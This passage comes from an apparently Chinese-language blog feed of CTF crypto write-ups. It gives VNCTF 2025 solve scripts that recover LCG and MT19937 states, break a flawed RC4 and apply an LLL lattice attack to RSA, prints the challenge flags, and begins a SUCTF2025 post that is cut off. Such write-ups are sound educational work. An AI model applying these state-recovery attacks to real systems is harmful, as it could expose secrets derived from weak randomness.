style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>就迎刃而解了（最初的seed用第一个数据就好了）</p><p>然后直接正着判断是否相等，相等就代表此位为0</p><p><img src="/imgs/vnctf2025/3.jpg" alt="1" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">onemod</span>(<span class="hljs-params">e, q</span>):<br>    p = random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span>(powmod(p, (q-<span class="hljs-number">1</span>)//e, q) == <span class="hljs-number">1</span>):  <span class="hljs-comment"># (r,s)=1</span><br>        p = random.randint(<span class="hljs-number">1</span>, q)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMM_rth</span>(<span class="hljs-params">o, r, q</span>):  <span class="hljs-comment"># r|(q-1</span><br>    <span class="hljs-keyword">assert</span>((q-<span class="hljs-number">1</span>) % r == <span class="hljs-number">0</span>)<br>    p = onemod(r, q)<br><br>    t = <span class="hljs-number">0</span><br>    s = q-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(s % r == <span class="hljs-number">0</span>):<br>        s = s//r<br>        t += <span class="hljs-number">1</span><br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>((s*k+<span class="hljs-number">1</span>) % r != <span class="hljs-number">0</span>):<br>        k += <span class="hljs-number">1</span><br>    alp = (s*k+<span class="hljs-number">1</span>)//r<br><br>    a = powmod(p, r**(t-<span class="hljs-number">1</span>)*s, q)<br>    b = powmod(o, r*a-<span class="hljs-number">1</span>, q)<br>    c = powmod(p, s, q)<br>    h = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t-<span class="hljs-number">1</span>):<br>        d = powmod(<span class="hljs-built_in">int</span>(b), r**(t-<span class="hljs-number">1</span>-i), q)<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br>            j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            j = (-math.log(d, a)) % r<br>        b = (b*(c**(r*j))) % q<br>        h = (h*c**j) % q<br>        c = (c*r) % q<br>    result = (powmod(o, alp, q)*h)<br>    <span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_Solution</span>(<span class="hljs-params">m, q, rt, cq, e</span>):<br>    mp = []<br>    <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> rt:<br>        r = (pr*m) % q<br>        <span class="hljs-comment"># assert(pow(r, e, q) == cq)</span><br>        mp.append(r)<br>    <span class="hljs-keyword">return</span> mp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_ROOT2</span>(<span class="hljs-params">r, q</span>):  <span class="hljs-comment"># use function set() and .add() ensure that the generated elements are not repeated</span><br>    li = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(li) &lt; r):<br>        p = powmod(random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>), (q-<span class="hljs-number">1</span>)//r, q)<br>        li.add(p)<br>    <span class="hljs-keyword">return</span> li<br>n=<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;n.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read())<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">FLAG1 = b&quot;VNCTF&#123;&quot;</span><br><span class="hljs-string">binary_flag = &#x27;&#x27;.join(f&quot;&#123;byte:08b&#125;&quot; for byte in FLAG1)</span><br><span class="hljs-string">print(binary_flag)</span><br><span class="hljs-string">&#x27;010101100100111001000011010101000100011001111011&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>s=[n[<span class="hljs-number">26</span>],n[<span class="hljs-number">28</span>],n[<span class="hljs-number">30</span>],n[<span class="hljs-number">32</span>],n[<span class="hljs-number">34</span>],n[<span class="hljs-number">36</span>]] <br>t = []<br>l=<span class="hljs-built_in">len</span>(s)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,l):<br>    t.append(s[i]-s[i-<span class="hljs-number">1</span>])<br> <br>all_p = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,l-<span class="hljs-number">3</span>):<br>    all_p.append(gcd((t[i+<span class="hljs-number">1</span>]*t[i-<span class="hljs-number">1</span>]-t[i]*t[i]), (t[i+<span class="hljs-number">2</span>]*t[i]-t[i+<span class="hljs-number">1</span>]*t[i+<span class="hljs-number">1</span>])))<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> all_p:<br>    p=<span class="hljs-built_in">abs</span>(p)<br>    <span class="hljs-keyword">if</span> p==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br>    <br>    a=(s[<span class="hljs-number">2</span>]-s[<span class="hljs-number">1</span>])*invert((s[<span class="hljs-number">1</span>]-s[<span class="hljs-number">0</span>]),p)%p<br> <br>    ani=invert(a,p)<br>    <br>    b=(s[<span class="hljs-number">1</span>]-a*s[<span class="hljs-number">0</span>])%p<br> <br>    seed = (ani*(s[<span class="hljs-number">0</span>]-b))%p<br>    <br><br>    mp = AMM_rth(a, <span class="hljs-number">2</span>, p)  <span class="hljs-comment"># AMM算法得到一个解</span><br><br>    rt1 = ALL_ROOT2(<span class="hljs-number">2</span>, p)<br><br>    amp = ALL_Solution(mp, p, rt1, a, <span class="hljs-number">2</span>)  <span class="hljs-comment"># 得到所有的mp</span><br>    <br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> amp:<br>        b=(n[<span class="hljs-number">32</span>]-a*n[<span class="hljs-number">31</span>])%p<br>        <br>        seed=((n[<span class="hljs-number">0</span>]-b)*inverse(a,p))%p<br><br><br>        flag=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> mi <span class="hljs-keyword">in</span> n:<br>            seed=(a*seed+b)%p<br>            <span class="hljs-keyword">if</span> seed == mi :<br>                flag+=<span class="hljs-string">&#x27;0&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                flag+=<span class="hljs-string">&#x27;1&#x27;</span><br>        <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>)))<br><br>    <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;VNCTF&#123;Happy_New_Year_C0ngratu1at&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="part2"><a class="markdownIt-Anchor" href="#part2"></a> part2</h3><p>格一下就行了，就爆破一下flag2的长度就好了，然后判断一下输出</p><p>自己生成测试第一个向量就是最短向量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">16880924655573626811763865075201881594085658222047473444427295924181371341406971359787070757333746323665180258925280624345937931067302673406166527557074157053768756954809954623549764696024889104571712837947570927160960150469942624060518463231436452655059364616329589584232929658472512262657486196000339385053006838678892053410082983193195313760143294107276239320478952773774926076976118332506709002823833966693933772855520415233420873109157410013754228009873467565264170667190055496092630482018483458436328026371767734605083997033690559928072813698606007542923203397847175503893541662307450142747604801158547519780249</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">9032357989989555941675564821401950498589029986516332099523507342092837051434738218296315677579902547951839735936211470189183670081413398549328213424711630953101945318953216233002076158699383482500577204410862449005374635380205765227970071715701130376936200309849157913293371540209836180873164955112090522763296400826270168187684580268049900241471974781359543289845547305509778118625872361241263888981982239852260791787315392967289385225742091913059414916109642527756161790351439311378131805693115561811434117214628348326091634314754373956682740966173046220578724814192276046560931649844628370528719818294616692090359</span><br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    L=Matrix(ZZ,l+<span class="hljs-number">2</span>,l+<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l+<span class="hljs-number">1</span>):<br>        L[i,i]=<span class="hljs-number">1</span><br>        L[i,-<span class="hljs-number">1</span>]=<span class="hljs-built_in">pow</span>((i+<span class="hljs-number">0x1234</span>),e,n)<br>    L[-<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>]=c<br>    L[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=-n<br>    x=L.LLL()[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(x[l-<span class="hljs-number">1</span>]))==<span class="hljs-number">125</span>:<br>        <span class="hljs-built_in">print</span>(l,x)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x[:l]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(i))),end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment">#i0ns_On_Rec0vering_The_Messages&#125;</span><br></code></pre></td></tr></table></figure><h2 id="并非rc4"><a class="markdownIt-Anchor" href="#并非rc4"></a> 并非RC4</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> small_key, flag<br><br><span class="hljs-comment">#你能找到这个实现错在哪吗</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">faulty_rc4_encrypt</span>(<span class="hljs-params">text</span>):<br>    data_xor_iv = []<br>    sbox = []<br>    j = <span class="hljs-number">0</span><br>    x = y = k = <span class="hljs-number">0</span><br>    key = small_key<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        sbox.append(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            j = j + sbox[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]) &amp; <span class="hljs-number">255</span><br>            sbox[i] = sbox[j]  <br>            sbox[j] = sbox[i]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> text:<br>                x = x + <span class="hljs-number">1</span> &amp; <span class="hljs-number">255</span><br>                y = y + sbox[x] &amp; <span class="hljs-number">255</span><br>                sbox[x] = sbox[y] <br>                sbox[y] = sbox[x]<br>                k = sbox[sbox[x] + sbox[y] &amp; <span class="hljs-number">255</span>]<br>                data_xor_iv.append(idx^k^<span class="hljs-number">17</span>)<br>    <span class="hljs-keyword">return</span> data_xor_iv<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    mt_string = <span class="hljs-built_in">bytes</span>([random.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40000</span>)])<br>    encrypted_data = faulty_rc4_encrypt(mt_string)<br>    <br>    p = nextprime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = nextprime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p * q<br>    e = <span class="hljs-number">65537</span><br>    <br>    flag_number = bytes_to_long(flag.encode())<br>    encrypted_flag = <span class="hljs-built_in">pow</span>(flag_number, e, n)<br>    <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data_RC4.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(<span class="hljs-built_in">str</span>(encrypted_data))<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>, n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>, e)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;encrypted_flag =&quot;</span>, encrypted_flag)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>不同就是在生成key的时候不是交换而是直接覆盖了，然后最后多异或了一个17</p><p>但是我分析不出来怎么攻击，直接自己执行了一遍这个代码，发现在后面的时候<code>idx^k^17</code>的这个k会等于一个值，自己测试就拿30000后面的数据发现可以解出来，直接爆破这个k就好了</p><p>然后就是MT19937的8bits分析，之前遇到过好多次类似的了就不讲了</p><p>总之就是爆破，爆了1个半小时</p><blockquote><p>问完出题人这就是预期解</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><br>data=<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data_RC4.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read())[<span class="hljs-number">30000</span>:]<br><br><br>RNG = Random()<br>length = <span class="hljs-number">19968</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_a_row</span>(<span class="hljs-params">RNG</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30000</span>):RNG.getrandbits(<span class="hljs-number">8</span>)<br>    ind = <span class="hljs-number">0</span><br>    row = []<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        t1 = <span class="hljs-built_in">bin</span>(RNG.getrandbits(<span class="hljs-number">8</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> tt <span class="hljs-keyword">in</span> t1:<br>            row.append(<span class="hljs-built_in">int</span>(tt))<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(row) &gt;= length):<br>            <span class="hljs-keyword">return</span> row<br>        ind += <span class="hljs-number">1</span><br><span class="hljs-string">&quot;&quot;&quot;L = []</span><br><span class="hljs-string">for i in trange(length):</span><br><span class="hljs-string">    state = [0]*624</span><br><span class="hljs-string">    temp = &quot;0&quot;*i + &quot;1&quot;*1 + &quot;0&quot;*(length-1-i)</span><br><span class="hljs-string">    for j in range(624):</span><br><span class="hljs-string">        state[j] = int(temp[32*j:32*j+32],2)</span><br><span class="hljs-string">    RNG.setstate((3,tuple(state+[624]),None))</span><br><span class="hljs-string">    L.append(construct_a_row(RNG))</span><br><span class="hljs-string">L = Matrix(GF(2),L)</span><br><span class="hljs-string">save(L, &quot;matrix.sobj&quot;)&quot;&quot;&quot;</span><br><span class="hljs-comment">#自己测试的时候已经生成好了，这里节省时间</span><br>L = load(<span class="hljs-string">&quot;matrix.sobj&quot;</span>)<br><span class="hljs-comment">#(123,256)</span><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> trange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>    data1=[key^i^<span class="hljs-number">17</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data]<br>    known = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data1:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>):<br>            known+=j<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(known) &gt;= length):<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">try</span>:<br>        s = L.solve_left(vector(GF(<span class="hljs-number">2</span>),known))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>(key)<br>    init = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,s)))<br>    state = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        state.append(<span class="hljs-built_in">int</span>(init[<span class="hljs-number">32</span>*i:<span class="hljs-number">32</span>*i+<span class="hljs-number">32</span>],<span class="hljs-number">2</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">backfirst</span>(<span class="hljs-params">state1</span>):<br>        high = <span class="hljs-number">0x80000000</span><br>        low = <span class="hljs-number">0x7fffffff</span><br>        mask1 = <span class="hljs-number">0x9908b0df</span><br>        tmp = state1[<span class="hljs-number">623</span>] ^ state1[<span class="hljs-number">396</span>]<br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask1<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span> - <span class="hljs-number">1</span>) | tmp &amp; low, tmp &amp; low<br>    seed1, seed2 = backfirst(state)<br>    state1 = [seed1] + state[<span class="hljs-number">1</span>:]<br>    state2 = [seed2] + state[<span class="hljs-number">1</span>:]<br><br><br>    n = <span class="hljs-number">26980604887403283496573518645101009757918606698853458260144784342978772393393467159696674710328131884261355662514745622491261092465745269577290758714239679409012557118030398147480332081042210408218887341210447413254761345186067802391751122935097887010056608819272453816990951833451399957608884115252497940851</span><br>    e = <span class="hljs-number">65537</span><br>    encrypted_flag = <span class="hljs-number">22847144372366781807296364754215583869872051137564987029409815879189317730469949628642001732153066224531749269434313483657465708558426141747771243442436639562785183869683190497179323158809757566582076031163900773712582568942616829434508926165117919744857175079480357695183964845638413639130567108300906156467</span><br>    prng = Random()<br>    prng.setstate(<span class="hljs-built_in">tuple</span>([<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(state1+[<span class="hljs-number">624</span>]), <span class="hljs-literal">None</span>]))<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40000</span>):<br>        prng.getrandbits(<span class="hljs-number">8</span>)<br>    p = next_prime(prng.getrandbits(<span class="hljs-number">512</span>))<br>    q = next_prime(prng.getrandbits(<span class="hljs-number">512</span>))<br>    <span class="hljs-built_in">print</span>(p)<br>    <span class="hljs-built_in">print</span>(q)<br>    <span class="hljs-keyword">if</span> n==p*q:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(encrypted_flag,inverse_mod(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),n))))<br><br>    prng = Random()<br>    prng.setstate(<span class="hljs-built_in">tuple</span>([<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(state2+[<span class="hljs-number">624</span>]), <span class="hljs-literal">None</span>]))<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40000</span>):<br>        prng.getrandbits(<span class="hljs-number">8</span>)<br>    p = next_prime(prng.getrandbits(<span class="hljs-number">512</span>))<br>    q = next_prime(prng.getrandbits(<span class="hljs-number">512</span>))<br>    <span class="hljs-built_in">print</span>(p)<br>    <span class="hljs-built_in">print</span>(q)<br>    <span class="hljs-keyword">if</span> n==p*q:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(encrypted_flag,inverse_mod(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),n))))<br><span class="hljs-string">&quot;&quot;&quot;&quot;</span><br><span class="hljs-string">123</span><br><span class="hljs-string">2849821642489040816444237149453951123096937420879364734457565300636069483308108133275885434910493679378607501786658532870247845818686651940429045958638523</span><br><span class="hljs-string">9467471397205882947962218830745171049297627946722122603974372237041601408122191262161200434063435224151339148022637680690503653259129267359148432740698537</span><br><span class="hljs-string">b&#x27;VNCTF&#123;FL4w3d_RC4_C0nv3rg3s_2_123_4nd_M1nd_Sm4ller_MT_Brut3&#125;&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h1><h2 id="vn_lang"><a class="markdownIt-Anchor" href="#vn_lang"></a> VN_Lang</h2><p>txt打开搜索vnctf就行</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF2025-crypto</title>
    <link href="/2025/01/12/suctf2025/"/>
    <url>/2025/01/12/suctf2025/</url>
    
    <content type="html"><![CDATA[<h1 id="suctf2025"><a class="markdownIt-Anchor" href="#suctf2025"></a> SUCTF2025</h1><p>题目很不错，但就出了两题，还有几题感兴趣的，有时间复现一下</p><blockquote><p>密码做题步骤：发动强大的搜索引擎，先拿代码问GPT,得到代码的大致流程和一些关键信息(比如算法、用到的知识点),然后打开搜索引擎(bing、Google),开始搜索对应知识点,最最重要的是:在前面加上ctf,然后对知识点加上双引号(搜索结果包含),然后直接找wp有脚本就好啦！</p></blockquote><h2 id="susignin"><a class="markdownIt-Anchor" href="#susignin"></a> SU—signin</h2><h3 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h3><p>数据就不贴了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>bit_length = <span class="hljs-built_in">len</span>(flag) * <span class="hljs-number">8</span><br><br>p = <span 